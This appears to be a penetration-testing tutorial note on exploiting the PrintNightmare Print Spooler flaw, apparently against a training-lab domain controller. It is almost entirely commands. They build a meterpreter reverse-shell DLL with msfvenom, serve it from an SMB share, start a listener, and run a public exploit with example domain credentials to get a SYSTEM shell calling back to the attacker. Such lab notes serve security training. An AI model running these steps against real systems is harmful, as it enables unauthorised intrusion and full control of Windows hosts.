---
title: PrintNightmare
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - windows
  - privilege
---
# 🖨️ PrintNightmare

`PrintNightmare` is the nickname given to two vulnerabilities ([CVE-2021-34527](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34527) and [CVE-2021-1675](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-1675)) found in the [Print Spooler service](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-prsod/7262f540-dd18-46a3-b645-8ea9b59753dc) that runs on all Windows operating systems.

We will be using [cube0x0's](https://twitter.com/cube0x0?lang=en) exploit.

```bash
git clone https://github.com/cube0x0/CVE-2021-1675.git
```

For this exploit to work successfully, we will need to use cube0x0's version of Impacket:

```bash
pip3 uninstall impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install
```

Enumerating for MS-RPRN:

```bash
# We can use rpcdump.py to see if Print System Asynchronous Protocol and Print System Remote Protocol are exposed on the target.
rpcdump.py @$DomainControllerIP | egrep 'MS-RPRN|MS-PAR'
# Example:
# rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'
```

After confirming this, we can proceed with attempting to use the exploit. We can begin by crafting a DLL payload using msfvenom.

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$IPhost LPORT=8080 -f dll > $FileName.dll
# Example:
# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll
```

We will then host this payload in an SMB share we create on our attack host using smbserver.py.

```bash
# Creating a Share with smbserver.py
sudo smbserver.py -smb2support $ShareName /path/to/$FileName.dll
# Example:
# sudo smbserver.py -smb2support CompData /home/
# This will leave our terminal in the host machine with no other use than that of sharing.
```

Then we will need to open a two new terminals in our attacker machine:

```bash
# In the first terminal we will configure ant start a MSF multi/handler
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.5.225
set LPORT 8080
run
```

```bash
# In the second terminal we will connect via ssh with the host machine:
ssh $user@$ip

# Then we run the exploit:
sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py $user/$user:$password@$domainControllerIP  '\\$ipHostMachine\$ShareName\$filename.dll'
# Example:
# sudo python3 /opt/CVE-2021-1675/CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'
```

The payload will then call back to our multi handler giving us an elevated SYSTEM shell.
